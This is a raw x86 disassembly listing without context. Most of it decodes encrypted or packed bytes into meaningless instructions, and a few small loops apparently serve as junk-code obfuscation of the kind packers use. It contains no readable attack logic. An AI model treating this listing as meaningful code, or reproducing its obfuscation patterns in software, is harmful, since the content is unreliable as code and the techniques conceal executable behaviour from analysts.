  412647:	adc    BYTE PTR [ecx+0xfa8836b],0x3
  41264e:	push   0x62
  412650:	push   ss
  412651:	fbld   TBYTE PTR [esi-0x2bba43df]
  412657:	mov    fs,WORD PTR [ecx-0x3c]
  41265a:	sub    ebx,0xffffffcd
  41265d:	ins    DWORD PTR es:[edi],dx
  41265e:	add    al,0x73
  412660:	(bad)  
  412661:	rol    DWORD PTR [eax],cl
  412663:	push   ss
  412664:	sub    DWORD PTR [esi],esi
  412666:	fisub  WORD PTR [esi]
  412668:	dec    ebp
  412669:	xchg   edx,eax
  41266a:	retf   0xe2ed
  41266d:	sub    al,BYTE PTR [ebp-0x49cb4743]
  412673:	sbb    ecx,DWORD PTR [eax]
  412675:	push   ebx
  412676:	imul   ecx,DWORD PTR [ebx+0x4a65510],0x650fba2b
  412680:	add    DWORD PTR [esp+ecx*8+0x5e4631ab],ecx
  412687:	mov    ds:0x267d32dd,al
  41268c:	leave  
  41268d:	sub    ch,ah
  41268f:	outs   dx,DWORD PTR ds:[esi]
  412690:	pop    ss
  412691:	fist   WORD PTR [ebx+0x3e]
  412694:	iret   
  412695:	dec    eax
  412696:	cmp    BYTE PTR [edi+ecx*8+0x2c5d8fc4],dl
  41269d:	inc    ebp
  41269e:	cmp    eax,0xfdf59cd7
  4126a3:	lods   eax,DWORD PTR ds:[esi]
  4126a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126a5:	pop    ebx
  4126a6:	aaa    
  4126a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126a8:	bound  edi,QWORD PTR [ecx+0x34]
  4126ab:	mov    ebp,0x98fef8b3
  4126b0:	xor    ecx,0x3fc14309
  4126b6:	or     edi,DWORD PTR [ebp-0x5201694d]
  4126bc:	pusha  
  4126bd:	inc    eax
  4126be:	mov    ds:0x37ed204b,al
  4126c3:	out    0x3a,al
  4126c5:	sub    eax,0xd5b0e787
  4126ca:	out    dx,eax
  4126cb:	and    ebp,DWORD PTR [ecx+0x77]
  4126ce:	sbb    ebx,DWORD PTR [ecx+0x63]
  4126d1:	xchg   ecx,eax
  4126d2:	mov    ds:0xe42a2950,al
  4126d7:	pop    ds
  4126d8:	stos   DWORD PTR es:[edi],eax
  4126d9:	call   0xa3c9a995
  4126de:	in     eax,dx
  4126df:	jp     0x4126f5
  4126e1:	scas   al,BYTE PTR es:[edi]
  4126e2:	mov    ah,0x50
  4126e4:	jge    0x412754
  4126e6:	pop    esp
  4126e7:	sti    
  4126e8:	dec    ecx
  4126e9:	fisub  DWORD PTR [edx+0x56]
  4126ec:	pop    edx
  4126ed:	jne    0x4126fb
  4126ef:	adc    ebx,DWORD PTR [esi+0x6ba4b286]
  4126f5:	bound  ebx,QWORD PTR [ebp+0x6a]
  4126f8:	jle    0x412714
  4126fa:	jno    0x4126ff
  4126fc:	(bad)  
  4126fd:	jo     0x412706
  4126ff:	pop    eax
  412700:	jo     0x412692
  412702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412703:	outs   dx,BYTE PTR ds:[esi]
  412704:	scas   eax,DWORD PTR es:[edi]
  412705:	jae    0x41270c
  412707:	inc    esi
  412708:	xor    al,0x2a
  41270a:	xor    al,0xe7
  41270c:	dec    esi
  41270d:	dec    ecx
  41270e:	imul   edx,edi,0xcdab6cfe
  412714:	pushf  
  412715:	frstor [edx+esi*8-0x143f686]
  41271c:	mov    bl,0xe0
  41271e:	inc    ebp
  41271f:	es sub edi,edx
  412722:	data16 jb 0x41271d
  412725:	mov    eax,DWORD PTR [ebp-0x6a6fd678]
  41272b:	xchg   BYTE PTR [esi-0x7],cl
  41272e:	sbb    BYTE PTR [edx-0x7e1bb277],0x25
  412735:	idiv   ch
  412737:	inc    edx
  412738:	add    BYTE PTR [eax],al
  41273a:	add    BYTE PTR [eax],al
  41273c:	add    cl,ch
  41273e:	sldt   WORD PTR [eax]
  412741:	add    BYTE PTR [ebx],dh
  412743:	leave  
  412744:	or     ecx,DWORD PTR ds:0x42fdf6
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fdf6,ecx
  412751:	cmp    DWORD PTR ds:0x42fdf6,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fdf6,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e393
  41277c:	cmp    DWORD PTR ds:0x42fdf6,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fdf6
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fdf6,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fdee,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    esi,DWORD PTR [esi+0x1d]
  4127bf:	aam    0xfb
  4127c1:	enter  0x7059,0x70
  4127c5:	mov    ecx,0xc670707e
  4127ca:	(bad)  
  4127cb:	sub    al,0x91
  4127cd:	mov    edx,0x551404bb
  4127d2:	and    BYTE PTR [eax+0x7d],0x5e
  4127d6:	lods   eax,DWORD PTR ds:[esi]
  4127d7:	add    BYTE PTR [edx-0x55f8376e],0x95
  4127de:	pop    DWORD PTR ds:0x2d08ee74
  4127e4:	jnp    0x412808
  4127e6:	push   ecx
  4127e7:	es sub al,0x6f
  4127ea:	loopne 0x412851
  4127ec:	add    eax,DWORD PTR [ebx-0x1f]
  4127ef:	arpl   cx,bp
  4127f1:	and    al,0xde
  4127f3:	mov    esp,0xdad3eb39
  4127f8:	cmp    BYTE PTR [edx+0x2bf0d74f],dh
  4127fe:	scas   eax,DWORD PTR es:[edi]
  4127ff:	adc    BYTE PTR [edx],bl
  412801:	bound  ecx,QWORD PTR [eax]
  412803:	inc    ebx
  412804:	inc    ebp
  412805:	popf   
  412806:	test   ch,bl
  412808:	jae    0x412835
  41280a:	ret    0xfe6b
  41280d:	cld    
  41280e:	dec    ebp
  41280f:	xor    al,0xbd
  412811:	mov    edx,0x73605df
  412816:	(bad)  
  412817:	mov    ecx,0xabfd9029
  41281c:	sbb    eax,0xe345cd22
  412821:	mov    ds:0xcd2143ea,al
  412826:	mov    ch,0x3
  412828:	ds inc esp
  41282a:	nop
  41282b:	and    al,0xe8
  41282d:	jnp    0x4127cc
  41282f:	jmp    0x30be4ba5
  412834:	cmp    al,BYTE PTR [eax-0x127f1913]
  41283a:	jecxz  0x412803
  41283c:	fsubr  QWORD PTR [ecx+eax*2-0x59ccfb50]
  412843:	ret    
  412844:	(bad)  
  412845:	jl     0x412855
  412847:	sbb    BYTE PTR [edi+0x2c],0x1f
  41284b:	or     ah,BYTE PTR [eax+0x45]
  41284e:	retf   
  41284f:	mov    edi,0xd4006960
  412854:	bound  ecx,QWORD PTR [ecx+0x62]
  412857:	cmp    esi,DWORD PTR [ebx+0x300bf449]
  41285d:	push   es
  41285e:	in     eax,dx
  41285f:	push   eax
  412860:	dec    edi
  412861:	shl    BYTE PTR [ecx+0x25856268],0x43
  412868:	mov    ch,BYTE PTR [edi-0x67e69e45]
  41286e:	je     0x4128d3
  412870:	dec    esp
  412871:	into   
  412872:	add    dl,BYTE PTR [eax-0x7c]
  412875:	scas   eax,DWORD PTR es:[edi]
  412876:	mov    edx,0x35ea8c37
  41287b:	sub    ah,BYTE PTR [edi]
  41287d:	pop    esi
  41287e:	enter  0x95ae,0x57
  412882:	outs   dx,DWORD PTR ds:[esi]
  412883:	mov    dl,0x48
  412885:	sbb    eax,0xa60b8e2e
  41288a:	outs   dx,BYTE PTR ds:[esi]
  41288b:	outs   dx,BYTE PTR ds:[esi]
  41288c:	ja     0x4128c4
  41288e:	dec    edx
  41288f:	and    DWORD PTR [esi],ecx
  412891:	mov    BYTE PTR [edi+0x6f],bl
  412894:	inc    edx
  412895:	cld    
  412896:	or     BYTE PTR [edi+0x2d4e22f5],cl
  41289c:	or     ebp,edi
  41289e:	test   al,al
  4128a0:	gs inc edx
  4128a2:	sbb    ah,BYTE PTR [edx+eiz*1+0x3d]
  4128a6:	and    esi,ebx
  4128a8:	dec    edx
  4128a9:	out    dx,eax
  4128aa:	jne    0x412881
  4128ac:	mov    dh,0x4c
  4128ae:	jl     0x4128dd
  4128b0:	scas   eax,DWORD PTR es:[edi]
  4128b1:	in     al,0x62
  4128b3:	cmp    DWORD PTR [esi-0x175c5e65],edi
  4128b9:	push   cs
  4128ba:	mov    esi,0x63328931
  4128bf:	retf   0x48c3
  4128c2:	jb     0x4128a9
  4128c4:	sbb    edx,ebx
  4128c6:	in     al,0xcd
  4128c8:	ret    
  4128c9:	add    eax,0x8545bead
  4128ce:	scas   al,BYTE PTR es:[edi]
  4128cf:	inc    ebx
  4128d0:	scas   eax,DWORD PTR es:[edi]
  4128d1:	adc    BYTE PTR [ebp+ebp*8+0x5e],dl
  4128d5:	mov    esp,0x70e3d35f
  4128da:	and    DWORD PTR ds:0xe27e082a,ebp
  4128e0:	or     eax,0xe73bba06
  4128e5:	dec    esp
  4128e6:	sar    DWORD PTR [ecx-0x3e],0x35
  4128ea:	add    edx,DWORD PTR [ebp+0xcb1a86f]
  4128f0:	pop    ss
  4128f1:	ins    BYTE PTR es:[edi],dx
  4128f2:	push   eax
  4128f3:	shl    esp,0xf8
  4128f6:	cmp    al,0xb6
  4128f8:	jmp    0x6ea4c1f6
  4128fd:	pop    edi
  4128fe:	xor    al,0xce
  412900:	xchg   esp,eax
  412901:	iret   
  412902:	std    
  412903:	or     edi,DWORD PTR [edi]
  412905:	push   edi
  412906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412907:	add    BYTE PTR [edx+0x59],dh
  41290a:	into   
  41290b:	push   0x27
  41290d:	jmp    0x4128f7
  41290f:	aam    0xd3
  412911:	imul   edi,DWORD PTR [edi],0xfffffff9
  412914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412915:	cmp    bh,cl
  412917:	iret   
  412918:	leave  
  412919:	outs   dx,DWORD PTR ds:[esi]
  41291a:	mov    al,BYTE PTR [ecx-0x3a952652]
  412920:	or     DWORD PTR [ebp+0x74859657],ebx
  412926:	xor    al,0x94
  412928:	xor    al,0x80
  41292a:	(bad)  
  41292b:	fldenv [edx+0x618fafe0]
  412931:	into   
  412932:	and    al,0x28
  412934:	mov    edi,0xec30148f
  412939:	js     0x412951
  41293b:	jmp    0x641b92bf
  412940:	clc    
  412941:	ror    DWORD PTR [esi],cl
  412943:	pusha  
  412944:	stc    
  412945:	xchg   ebp,eax
  412946:	xchg   BYTE PTR [esi-0x5d048cc7],bl
  41294c:	sar    DWORD PTR [ebx-0x170c7950],1
  412952:	mov    DWORD PTR [ebx+0x0],esp
  412955:	or     esi,DWORD PTR [eax-0x6]
  412958:	mov    ebp,0x8820773e
  41295d:	and    dh,cl
  41295f:	jp     0x4129ba
  412961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412962:	das    
  412963:	inc    eax
  412964:	nop
  412965:	or     esi,ecx
  412967:	retf   
  412968:	push   eax
  412969:	sbb    DWORD PTR [ecx+0x1589e0d2],edx
  41296f:	pop    ds
  412970:	mov    ebp,0xb62ea60
  412975:	inc    esi
  412976:	xchg   esi,eax
  412977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412978:	imul   esp,DWORD PTR [bx+di-0x1b],0x4f
  41297d:	xchg   DWORD PTR [esi],ebx
  41297f:	adc    ebx,DWORD PTR [edi]
  412981:	adc    al,0x9c
  412983:	in     al,0xd7
  412985:	sbb    bl,BYTE PTR [ebx+0xc5ad05]
  41298b:	imul   BYTE PTR ds:[ebx]
  41298e:	jmp    0xa127:0xade966bc
  412995:	inc    edx
  412996:	or     al,BYTE PTR [eax+0x5258f578]
  41299c:	div    dh
  41299e:	call   0xea788714
  4129a3:	(bad)  
  4129a4:	jge    0x4129d0
  4129a6:	test   BYTE PTR [edx],cl
  4129a8:	ins    BYTE PTR es:[edi],dx
  4129a9:	test   eax,0xaf6fa537
  4129ae:	mov    ebx,0x1d4b9115
  4129b3:	push   esp
  4129b4:	fdivr  st,st(1)
  4129b6:	inc    eax
  4129b7:	imul   DWORD PTR [edi]
  4129b9:	jb     0x412952
  4129bb:	outs   dx,DWORD PTR ds:[esi]
  4129bc:	push   ebx
  4129bd:	dec    ecx
  4129be:	push   es
  4129bf:	into   
  4129c0:	sar    BYTE PTR [edi],0x53
  4129c3:	xchg   ebx,eax
  4129c4:	rcr    DWORD PTR [eax-0x78173259],1
  4129ca:	ss das 
  4129cc:	or     al,0xc1
  4129ce:	es je  0x412a0d
  4129d1:	mov    cl,0x8d
  4129d3:	sbb    edx,DWORD PTR [eax+0x27]
  4129d6:	dec    edx
  4129d7:	dec    ebp
  4129d8:	pop    es
  4129d9:	pop    esp
  4129da:	adc    eax,0x54c92d01
  4129df:	xchg   esp,eax
  4129e0:	retf   0x9f82
  4129e3:	loop   0x412a3d
  4129e5:	fst    DWORD PTR [ebp+0x1f7e7d02]
  4129eb:	xlat   BYTE PTR ds:[ebx]
  4129ec:	xor    dh,0xdf
  4129ef:	and    al,0x3a
  4129f1:	jge    0x412999
  4129f3:	mov    ds:0xee43257d,al
  4129f8:	mov    bl,0x6d
  4129fa:	xor    al,0x30
  4129fc:	aam    0x30
  4129fe:	fimul  DWORD PTR [ebx-0x68]
  412a01:	fbld   TBYTE PTR [esi]
  412a03:	add    DWORD PTR [edx-0x7a],edi
  412a06:	outs   dx,DWORD PTR ds:[esi]
  412a07:	cmp    al,0x1f
  412a09:	dec    edi
  412a0a:	xchg   edi,eax
  412a0b:	(bad)  
  412a0d:	xor    BYTE PTR [ebp-0x5f],cl
  412a10:	test   al,0xbc
  412a12:	shl    BYTE PTR [ebx],1
  412a14:	loopne 0x412a14
  412a16:	loope  0x4129e5
  412a18:	inc    esp
  412a19:	ins    BYTE PTR es:[edi],dx
  412a1a:	dec    esi
  412a1b:	jg     0x412a5d
  412a1d:	(bad)  
  412a1e:	xor    eax,0xa4d6dd9b
  412a23:	ins    BYTE PTR es:[edi],dx
  412a24:	xchg   esp,eax
  412a25:	aas    
  412a26:	cmp    ah,BYTE PTR [esi+0x7c6ba104]
  412a2c:	in     eax,0x19
  412a2e:	pop    ds
  412a2f:	jno    0x412a4a
  412a31:	pop    ebx
  412a32:	xor    eax,0xd2aaad2a
  412a37:	ss inc ebp
  412a39:	pop    esi
  412a3a:	shl    DWORD PTR [esi+0x6f],0x1e
  412a3e:	lds    esp,FWORD PTR [esi]
  412a40:	gs jg  0x412a21
  412a43:	adc    al,0xdb
  412a45:	jns    0x412a2b
  412a47:	add    al,0x93
  412a49:	inc    eax
  412a4a:	pop    es
  412a4b:	xchg   BYTE PTR [edx],ah
  412a4d:	pop    edi
  412a4e:	mov    al,0x3c
  412a50:	repz scas eax,DWORD PTR es:[edi]
  412a52:	mov    dh,0xfe
  412a54:	push   edx
  412a55:	iret   
  412a56:	add    al,0x49
  412a58:	fadd   st(0),st
  412a5a:	loope  0x4129de
  412a5c:	or     BYTE PTR [edx+ecx*8],bh
  412a5f:	push   0xffffffa9
  412a61:	xchg   DWORD PTR [edi-0xe],edx
  412a64:	jnp    0x412a7e
  412a66:	mov    ah,0x91
  412a68:	and    DWORD PTR [ebx-0x384b728d],eax
  412a6e:	and    bh,BYTE PTR ds:0x921811d
  412a74:	sub    eax,0x2240682f
  412a79:	shr    BYTE PTR [edx+0x76],0xe7
  412a7d:	push   esi
  412a7e:	sub    edi,DWORD PTR [eax]
  412a80:	je     0x412a28
  412a82:	xchg   ebx,eax
  412a83:	test   DWORD PTR [edi+0x2474387d],ebx
  412a89:	hlt    
  412a8a:	mov    DWORD PTR [ebx],ebx
  412a8c:	loopne 0x412ac5
  412a8e:	dec    ebp
  412a8f:	sub    DWORD PTR [edi],ecx
  412a91:	test   BYTE PTR [eax],dl
  412a93:	add    BYTE PTR [eax],al
  412a95:	add    BYTE PTR [ebx+0x3d03144d],cl
  412a9b:	mov    al,ds:0x8b0042e1
  412aa0:	or     DWORD PTR [ebx],ecx
  412aa2:	test   BYTE PTR [ecx+0x5c7e44d],0x75
  412aa9:	std    
  412aaa:	inc    edx
  412aab:	add    BYTE PTR [edi],dl
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebx+0x42fd753d],al
  412ab5:	add    BYTE PTR [eax],al
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fd75,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e397
  412af1:	mov    edi,DWORD PTR ds:0x42fd75
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fd75,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e1a8
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e198,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b16
  412b3b:	pushf  
  412b3c:	stos   DWORD PTR es:[edi],eax
  412b3d:	fcom   QWORD PTR [ecx]
  412b3f:	data16 jo 0x412bb2
  412b42:	mov    ecx,0x5c70707e
  412b47:	fcom   DWORD PTR ds:0xe16ebec9
  412b4d:	retf   0xd91e
  412b50:	or     ecx,ebx
  412b52:	jne    0x412b61
  412b54:	mov    bl,0xc1
  412b56:	mov    ecx,esp
  412b58:	cmp    ecx,DWORD PTR [ebx+esi*1+0x5c]
  412b5c:	or     al,BYTE PTR [ecx-0x1dfab5a1]
  412b62:	and    ebx,eax
  412b64:	sub    al,BYTE PTR [ebp-0x5f8f85ee]
  412b6a:	xlat   BYTE PTR ds:[ebx]
  412b6b:	push   edi
  412b6c:	imul   ebp,DWORD PTR [eax],0xef051fa6
  412b72:	stos   BYTE PTR es:[edi],al
  412b73:	dec    esi
  412b74:	push   esp
  412b75:	push   0xffffffe2
  412b77:	xor    al,0xc3
  412b79:	xor    DWORD PTR [ecx],ebx
  412b7b:	(bad)  
  412b7c:	(bad)  
  412b7d:	push   esi
  412b7e:	push   0xb
  412b80:	adc    eax,0x559d632f
  412b85:	sti    
  412b86:	ds dec esi
  412b88:	sbb    DWORD PTR [ebp-0x4b],edi
  412b8b:	sbb    BYTE PTR [ecx],ch
  412b8d:	sub    eax,0x3ae32165
  412b92:	(bad)  
  412b94:	fld    TBYTE PTR [edx]
  412b96:	push   esi
  412b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b98:	mov    esi,0x137b32f
  412b9d:	loopne 0x412b4c
  412b9f:	push   ecx
  412ba0:	bound  edx,QWORD PTR [ebp-0x19a98350]
  412ba6:	jmp    0x45cf:0xe6da4eec
  412bad:	jl     0x412b88
  412baf:	cld    
  412bb0:	aam    0xa2
  412bb2:	ret    
  412bb3:	scas   al,BYTE PTR es:[edi]
  412bb4:	mov    bl,0xf8
  412bb6:	(bad)  
  412bb7:	(bad)  
  412bb8:	jbe    0x412b75
  412bba:	pop    ecx
  412bbb:	xor    BYTE PTR [ebp+0x7c],0xf0
  412bbf:	sub    ebx,ecx
  412bc1:	pop    ds
  412bc2:	fdivr  st,st(3)
  412bc4:	jns    0x412bd1
  412bc6:	push   0x93a0fc86
  412bcb:	fwait
  412bcc:	mov    eax,0x433b3151
  412bd1:	sub    eax,0x1c2f38
  412bd6:	fst    st(0)
  412bd9:	inc    edx
  412bda:	mov    edi,0x478bc372
  412bdf:	jp     0x412b9c
  412be1:	mov    esi,0x2fcf81a0
  412be6:	nop
  412be7:	cli    
  412be8:	arpl   WORD PTR [ecx],ax
  412bea:	add    edi,esi
  412bec:	clc    
  412bed:	sbb    esi,DWORD PTR [ebx]
  412bef:	pop    ss
  412bf0:	call   0x104ad126
  412bf5:	fmul   QWORD PTR [ebx]
  412bf7:	jo     0x412ba4
  412bf9:	lea    ecx,[esi]
  412bfb:	outs   dx,BYTE PTR ds:[esi]
  412bfc:	mov    cl,0x4f
  412bfe:	stc    
  412bff:	dec    edi
  412c00:	sub    al,0x64
  412c02:	adc    eax,0xd2f2c44b
  412c07:	clc    
  412c08:	inc    esp
  412c09:	xchg   esi,eax
  412c0a:	int    0x5e
  412c0c:	or     eax,0xe81c121f
  412c11:	and    bl,0xf1
  412c14:	cmp    edi,DWORD PTR [edx]
  412c16:	or     edi,esp
  412c18:	scas   eax,DWORD PTR es:[edi]
  412c19:	push   0xb33f5eb6
  412c1e:	inc    esp
  412c1f:	popf   
  412c20:	pop    esi
  412c21:	or     eax,0xbfa05b1b
  412c26:	hlt    
  412c27:	jge    0x412c53
  412c29:	lods   eax,DWORD PTR ds:[esi]
  412c2a:	adc    bh,BYTE PTR [edi+0x63]
  412c2d:	pop    edx
  412c2e:	sbb    al,0xaa
  412c30:	and    ah,0x46
  412c33:	fimul  WORD PTR [ebx]
  412c35:	xchg   edx,eax
  412c36:	mov    ds:0x89e0a67,al
  412c3b:	ror    BYTE PTR [edx-0x5fad4519],1
  412c41:	mov    ch,BYTE PTR [edx-0x22110e9f]
  412c47:	stos   BYTE PTR es:[edi],al
  412c48:	inc    BYTE PTR [edx]
  412c4a:	mov    cl,0x64
  412c4c:	sub    eax,0xe6c7513f
  412c51:	aam    0x41
  412c53:	mov    cl,0x2a
  412c55:	dec    ecx
  412c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c57:	jl     0x412c71
  412c59:	mov    ds:0x78cc00d6,al
  412c5e:	fwait
  412c5f:	jae    0x412cbe
  412c61:	(bad)  
  412c62:	lock loop 0x412c0d
  412c65:	mov    ebp,0x72983668
  412c6a:	push   edx
  412c6b:	xchg   esi,eax
  412c6c:	sub    eax,0xe47d0f44
  412c71:	mov    esp,0xc223f240
  412c76:	bound  ecx,QWORD PTR [ebp-0x74]
  412c79:	sub    al,0xdc
  412c7b:	adc    eax,0x7e0971f6
  412c80:	loopne 0x412cd7
  412c82:	push   ecx
  412c83:	push   ecx
  412c84:	and    BYTE PTR [esi-0x4a],bl
  412c87:	pop    ecx
  412c88:	and    ebp,esp
  412c8a:	rcl    BYTE PTR [edx-0x7c],0x4b
  412c8e:	sbb    edi,DWORD PTR [ecx-0x11]
  412c91:	jl     0x412c4c
  412c93:	cmp    BYTE PTR [edx+ecx*4],dh
  412c96:	mov    eax,0x9e5e52c9
  412c9b:	dec    edx
  412c9c:	sahf   
  412c9d:	inc    edx
  412c9e:	ja     0x412ce2
  412ca0:	test   al,bh
  412ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ca3:	and    ecx,DWORD PTR [ebx-0x5f9dd9c9]
  412ca9:	retf   0x858b
  412cac:	and    eax,0x906e24e1
  412cb1:	ret    0x1c1
  412cb4:	lods   al,BYTE PTR ds:[esi]
  412cb5:	in     eax,dx
  412cb6:	mov    fs:0x9733941f,eax
  412cbc:	in     al,0x45
  412cbe:	xchg   esp,eax
  412cbf:	mov    ch,0xfc
  412cc1:	push   ss
  412cc2:	leave  
  412cc3:	sbb    DWORD PTR [edi+edi*1],0x249b12b0
  412cca:	inc    ebx
  412ccb:	aas    
  412ccc:	mov    ch,0xfe
  412cce:	rcl    BYTE PTR [eax-0x3abd6fef],0x11
  412cd5:	adc    DWORD PTR [esp+ebx*4-0x7a],edi
  412cd9:	xchg   edi,eax
  412cda:	stc    
  412cdb:	mov    esp,0xb00bb365
  412ce0:	or     al,0xb
  412ce2:	jg     0x412c70
  412ce4:	dec    esi
  412ce5:	stos   BYTE PTR es:[edi],al
  412ce6:	xchg   BYTE PTR [esp+ebp*1+0xb],ch
  412cea:	and    esp,esi
  412cec:	aaa    
  412ced:	xchg   esp,eax
  412cee:	cmp    BYTE PTR [ebp+0x34ef54bc],bh
  412cf4:	dec    esi
  412cf5:	icebp  
  412cf6:	lds    ebp,FWORD PTR [edx+edx*4-0x1a]
  412cfa:	mov    al,dl
  412cfc:	(bad)  
  412cfd:	mov    ds:0xc3df974c,al
  412d02:	loop   0x412d59
  412d04:	loopne 0x412cdc
  412d06:	push   cs
  412d07:	adc    ah,dh
  412d09:	and    al,BYTE PTR [edi+edx*4+0x56b91a98]
  412d10:	int    0xac
  412d12:	stos   BYTE PTR es:[edi],al
  412d13:	out    0xa9,al
  412d15:	stos   DWORD PTR es:[edi],eax
  412d16:	retf   
  412d17:	stos   BYTE PTR es:[edi],al
  412d18:	sti    
  412d19:	int    0x85
  412d1b:	mov    ebx,DWORD PTR [esi+0x2ccd6349]
  412d21:	out    0xc,al
  412d23:	pop    esi
  412d24:	sbb    BYTE PTR [edx-0x7e],al
  412d27:	in     al,dx
  412d28:	sub    DWORD PTR [edx+edi*8+0xb9d18fe],esp
  412d2f:	mov    edi,0x3893da3
  412d34:	mov    esp,0x5093c6e0
  412d39:	popf   
  412d3a:	adc    DWORD PTR [edx-0x3a4900c3],edi
  412d40:	pop    eax
  412d41:	stc    
  412d42:	xchg   BYTE PTR [ecx],al
  412d44:	cmp    BYTE PTR [esi+0x7fb50b6c],ch
  412d4a:	mov    esi,0x28168d04
  412d4f:	sbb    al,0x56
  412d51:	xor    eax,0x114e659f
  412d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d57:	scas   eax,DWORD PTR es:[edi]
  412d58:	lods   al,BYTE PTR ds:[esi]
  412d59:	dec    edi
  412d5a:	outs   dx,DWORD PTR ds:[esi]
  412d5b:	or     eax,DWORD PTR [esi+0x67]
  412d5e:	add    cl,bl
  412d60:	jmp    0xf7b03c3f
  412d65:	mov    bh,0xf6
  412d67:	dec    DWORD PTR [esi-0x6b]
  412d6a:	xchg   ecx,eax
  412d6b:	mov    eax,ebx
  412d6d:	push   ebx
  412d6e:	fdivr  st(1),st
  412d70:	clc    
  412d71:	adc    eax,0xe0406a56
  412d76:	fstp   QWORD PTR [edi+0x7c7e1a4d]
  412d7c:	xchg   ecx,eax
  412d7d:	or     bl,dl
  412d7f:	or     eax,0x27fcced6
  412d84:	push   edx
  412d85:	add    DWORD PTR [ecx-0x3a],0x4d
  412d89:	cmp    DWORD PTR [ebp+0x44],edx
  412d8c:	shl    DWORD PTR [edx],0x3a
  412d8f:	or     al,0x2b
  412d91:	inc    edx
  412d92:	loopne 0x412d54
  412d94:	fwait
  412d95:	lds    ecx,FWORD PTR [ecx]
  412d97:	and    eax,0x92ed82f8
  412d9c:	scas   eax,DWORD PTR es:[edi]
  412d9d:	retf   0xb184
  412da0:	test   BYTE PTR [ecx-0x1f],0x3b
  412da4:	cmp    al,0x73
  412da6:	loope  0x412e0b
  412da8:	ss push ds
  412daa:	(bad)  
  412dab:	out    dx,al
  412dac:	mov    ebp,0xdbaa038d
  412db1:	sub    al,0x5b
  412db3:	fiadd  WORD PTR [esi]
  412db5:	or     ecx,ebx
  412db7:	jnp    0x412d52
  412db9:	fdiv   DWORD PTR [esi+0x7c]
  412dbc:	in     eax,dx
  412dbd:	mov    al,0x21
  412dbf:	mov    ebx,0x19c9699c
  412dc4:	fs cld 
  412dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dc7:	popa   
  412dc8:	cmp    eax,0x5eef22ef
  412dcd:	cli    
  412dce:	out    dx,al
  412dcf:	sub    al,0xfb
  412dd1:	(bad)  
  412dd2:	or     DWORD PTR [eax],0xffffffd4
  412dd5:	in     al,dx
  412dd6:	xchg   ecx,eax
  412dd7:	or     al,0x66
  412dd9:	pop    ebx
  412dda:	mov    edi,0x602c1d64
  412ddf:	adc    ax,0x86da
  412de3:	fnstenv [ecx+edx*1+0x5b0d3527]
  412dea:	xchg   DWORD PTR [edx],edx
  412dec:	icebp  
  412ded:	enter  0xd5d,0x93
  412df1:	cs addr16 je 0x412e59
  412df5:	call   0x3a4e:0xdd7ef8f9
  412dfc:	jecxz  0x412e23
  412dfe:	xchg   edi,eax
  412dff:	pop    ebp
  412e00:	jg     0x412e50
  412e02:	mov    ecx,0x6d760d93
  412e07:	sub    ecx,eax
  412e09:	jno    0x412e41
  412e0b:	mov    bh,0xb1
  412e0d:	xchg   esi,ecx
  412e0f:	and    DWORD PTR ds:0x42e19c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e19c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e19c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e19c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e19c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e507
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
